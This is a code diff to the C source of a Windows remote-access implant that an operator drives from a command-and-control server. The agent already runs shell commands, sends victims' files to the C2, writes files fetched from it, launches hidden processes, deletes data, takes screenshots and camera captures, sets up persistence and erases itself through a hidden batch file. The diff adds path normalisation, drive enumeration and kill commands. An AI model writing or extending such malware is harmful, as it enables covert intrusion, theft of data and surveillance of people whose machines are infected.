@@ -252,9 +252,22 @@ static char *exec_shell(const char *cmd) {
     CloseHandle(hRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return out;
 }
 
+static void normalize_path(const char *in, char *out, size_t out_sz) {
+    const char *p = in[0] == '/' ? in + 1 : in;
+    strncpy(out, p, out_sz - 1); out[out_sz - 1] = 0;
+    for (char *q = out; *q; q++) if (*q == '/') *q = '\\';
+    if (out[0] && out[1] == ':' && out[2] != '\\') {
+        char temp[MAX_PATH];
+        snprintf(temp, sizeof(temp), "%c:\\%s", out[0], out + 2);
+        strncpy(out, temp, out_sz - 1); out[out_sz - 1] = 0;
+    }
+}
+
 static char *read_file(const char *path) {
     if (!path || !path[0]) return _strdup("[-] usage: read <path>");
-    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    char clean[MAX_PATH];
+    normalize_path(path, clean, sizeof(clean));
+    HANDLE h = CreateFileA(clean, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (h == INVALID_HANDLE_VALUE) return _strdup("[-] File not found or access denied");
     DWORD sz = GetFileSize(h, NULL);
     if (sz == INVALID_FILE_SIZE || sz > 10485760) { CloseHandle(h); return _strdup("[-] File too large (>10MB)"); }
@@ -297,9 +310,41 @@ static char *browse_dir(const char *path) {
     FindClose(hf); strcat(buf, "]}"); return buf;
 }
 
+static char *list_drives(void) {
+    char drives[512];
+    DWORD n = GetLogicalDriveStringsA(sizeof(drives) - 1, drives);
+    if (!n || n > sizeof(drives) - 2) return _strdup("{\"files\":[]}");
+    size_t cap = 4096, used = 0;
+    char *buf = (char*)malloc(cap);
+    if (!buf) return _strdup("{\"error\":\"OOM\"}");
+    memcpy(buf, "{\"files\":[", 10); used = 10;
+    int first = 1;
+    for (char *d = drives; *d; d += strlen(d) + 1) {
+        UINT t = GetDriveTypeA(d);
+        if (t == DRIVE_NO_ROOT_DIR || t == DRIVE_UNKNOWN) continue;
+        const char *ts = (t == DRIVE_FIXED) ? "fixed" : (t == DRIVE_REMOVABLE) ? "removable" :
+                         (t == DRIVE_CDROM) ? "cdrom" : (t == DRIVE_REMOTE) ? "network" : "other";
+        ULARGE_INTEGER total = {0,0};
+        GetDiskFreeSpaceExA(d, NULL, &total, NULL);
+        char name[4]; strncpy(name, d, 2); name[2] = 0;
+        char entry[256];
+        int elen = snprintf(entry, sizeof(entry),
+            "{\"name\":\"%s\",\"type\":\"drive\",\"drive_type\":\"%s\",\"size\":%llu,\"modified\":\"\"}",
+            name, ts, (unsigned long long)total.QuadPart);
+        while (used + (size_t)elen + 3 > cap) { cap *= 2; char *tmp = (char*)realloc(buf, cap); if (!tmp) { free(buf); return _strdup("{\"error\":\"OOM\"}"); } buf = tmp; }
+        if (!first) buf[used++] = ',';
+        first = 0;
+        memcpy(buf + used, entry, (size_t)elen); used += (size_t)elen; buf[used] = 0;
+    }
+    buf[used++] = ']'; buf[used++] = '}'; buf[used] = 0;
+    return buf;
+}
+
 static char *upload_file(const char *path) {
     if (!path || !path[0]) return _strdup("[-] usage: upload <path>");
-    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    char clean[MAX_PATH];
+    normalize_path(path, clean, sizeof(clean));
+    HANDLE h = CreateFileA(clean, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (h == INVALID_HANDLE_VALUE) return _strdup("[-] File not found");
     DWORD sz = GetFileSize(h, NULL); if (sz > 10485760) { CloseHandle(h); return _strdup("[-] File too large"); }
     unsigned char *data = (unsigned char*)malloc(sz); if (!data) { CloseHandle(h); return _strdup("[-] OOM"); }
@@ -307,7 +352,7 @@ static char *upload_file(const char *path) {
     CloseHandle(h);
     char *b64 = b64_encode(data, r); free(data); if (!b64) return _strdup("[-] B64 failed");
     char *esc_data = json_escape(b64); free(b64); if (!esc_data) return _strdup("[-] Escape failed");
-    const char *fname = strrchr(path, '\\'); fname = fname ? fname + 1 : path;
+    const char *fname = strrchr(clean, '\\'); fname = fname ? fname + 1 : clean;
     char *esc_name = json_escape(fname); char *uuid_e = json_escape(g_uuid);
     size_t body_sz = strlen(esc_data) + strlen(esc_name) + strlen(uuid_e) + 128;
     char *body = (char*)malloc(body_sz);
@@ -320,19 +365,20 @@ static char *upload_file(const char *path) {
 }
 
 static char *cmd_download(const char *arg) {
-    char file_id[256], out_path[MAX_PATH];
+    char file_id[256], out_path[MAX_PATH], clean_out[MAX_PATH];
     if (sscanf(arg, "%255s %1023s", file_id, out_path) < 2) return _strdup("[-] usage: download <file_id> <output_path>");
+    normalize_path(out_path, clean_out, sizeof(clean_out));
     char query[512]; snprintf(query, sizeof(query), "action=file&id=%s", file_id);
     DWORD len = 0; unsigned char *data = http_get_binary(query, &len);
     if (!data) return _strdup("[-] Download failed");
-    char parent[MAX_PATH]; strncpy(parent, out_path, sizeof(parent));
+    char parent[MAX_PATH]; strncpy(parent, clean_out, sizeof(parent));
     char *last = strrchr(parent, '\\'); if (!last) last = strrchr(parent, '/');
     if (last) { *last = 0; CreateDirectoryA(parent, NULL); }
-    HANDLE h = CreateFileA(out_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE h = CreateFileA(clean_out, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (h == INVALID_HANDLE_VALUE) { free(data); return _strdup("[-] Cannot write output path"); }
     DWORD w; WriteFile(h, data, len, &w, NULL); CloseHandle(h);
-    char *result = (char*)malloc(strlen(out_path) + 64);
-    sprintf(result, "[+] Downloaded %lu bytes to %s", (unsigned long)len, out_path);
+    char *result = (char*)malloc(strlen(clean_out) + 64);
+    sprintf(result, "[+] Downloaded %lu bytes to %s", (unsigned long)len, clean_out);
     free(data); return result;
 }
 
@@ -405,12 +451,14 @@ static char *cmd_run(const char *arg, WORD show) {
 
 static char *cmd_delete(const char *arg) {
     if (!arg || !arg[0]) return _strdup("[-] usage: delete <path>");
-    if (DeleteFileA(arg)) return _strdup("[+] Deleted");
-    if (RemoveDirectoryA(arg)) return _strdup("[+] Directory removed");
-    DWORD attr = GetFileAttributesA(arg); char cmd[4096];
+    char clean[MAX_PATH];
+    normalize_path(arg, clean, sizeof(clean));
+    if (DeleteFileA(clean)) return _strdup("[+] Deleted");
+    if (RemoveDirectoryA(clean)) return _strdup("[+] Directory removed");
+    DWORD attr = GetFileAttributesA(clean); char cmd[4096];
     if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
-        snprintf(cmd, sizeof(cmd), "cmd.exe /c rmdir /s /q \"%s\"", arg);
-    else snprintf(cmd, sizeof(cmd), "cmd.exe /c del /f /q \"%s\"", arg);
+        snprintf(cmd, sizeof(cmd), "cmd.exe /c rmdir /s /q \"%s\"", clean);
+    else snprintf(cmd, sizeof(cmd), "cmd.exe /c del /f /q \"%s\"", clean);
     return exec_shell(cmd);
 }
 
@@ -463,11 +511,12 @@ static void self_destruct(void) {
     if (fnMoveFileEx) fnMoveFileEx(exe_path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
     DeleteFileA(exe_path);
     char bat_path[MAX_PATH]; GetEnvironmentVariableA("TEMP", bat_path, sizeof(bat_path)); strcat(bat_path, "\\cleanup.bat");
-    char bat_content[2048]; snprintf(bat_content, sizeof(bat_content), "@echo off\r\ntimeout /t 2 /nobreak >nul\r\ndel /f /q \"%s\" 2>nul\r\ndel /f /q \"%s\" 2>nul\r\ndel /f /q \"%s\" 2>nul\r\ndel /f /q \"%%~f0\" 2>nul\r\n", dest, exe_path, startup);
+    char bat_content[2048]; snprintf(bat_content, sizeof(bat_content), "@echo off\r\nping -n 3 127.0.0.1 >nul\r\ndel /f /q \"%s\" 2>nul\r\ndel /f /q \"%s\" 2>nul\r\ndel /f /q \"%s\" 2>nul\r\ndel /f /q \"%%~f0\" 2>nul\r\n", dest, exe_path, startup);
     HANDLE hBat = CreateFileA(bat_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hBat != INVALID_HANDLE_VALUE) { DWORD w; WriteFile(hBat, bat_content, (DWORD)strlen(bat_content), &w, NULL); CloseHandle(hBat);
         STARTUPINFOA si = { sizeof(si) }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; PROCESS_INFORMATION pi;
-        CreateProcessA(NULL, bat_path, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+        char cmd[MAX_PATH + 10]; snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", bat_path);
+        CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
     }
     ExitProcess(0);
 }
@@ -481,6 +530,7 @@ static char *exec_task(const char *cmd) {
     const char *arg = sp ? sp + 1 : "";
     if (!strcmp(action, "shell")) return exec_shell(arg);
     if (!strcmp(action, "browse")) return browse_dir(arg);
+    if (!strcmp(action, "drives")) return list_drives();
     if (!strcmp(action, "read")) return read_file(arg);
     // pull  = transfer file TARGET -> C2 (operator downloads from target)
     // push  = transfer file C2 -> TARGET (operator uploads to target)
@@ -490,7 +540,7 @@ static char *exec_task(const char *cmd) {
     if (!strcmp(action, "runhide")) return cmd_run(arg, SW_HIDE);
     if (!strcmp(action, "delete")) return cmd_delete(arg);
     if (!strcmp(action, "screenshot")) return take_screenshot();
-    if (!strcmp(action, "camera")) return cmd_camera();
+    if (!strcmp(action, "camera") || !strcmp(action, "cam")) return cmd_camera();
     if (!strcmp(action, "ping")) {
         SYSTEMTIME st; GetLocalTime(&st);
         char *b = (char*)malloc(64);
@@ -498,6 +548,7 @@ static char *exec_task(const char *cmd) {
         return b;
     }
     if (!strcmp(action, "persist")) return persist();
+    if (!strcmp(action, "die") || !strcmp(action, "killself")) { ExitProcess(0); return _strdup("[DEAD]"); }
     if (!strcmp(action, "selfdestruct")) { self_destruct(); return _strdup("[SELFDESTRUCT]"); }
     return exec_shell(cmd);
 }
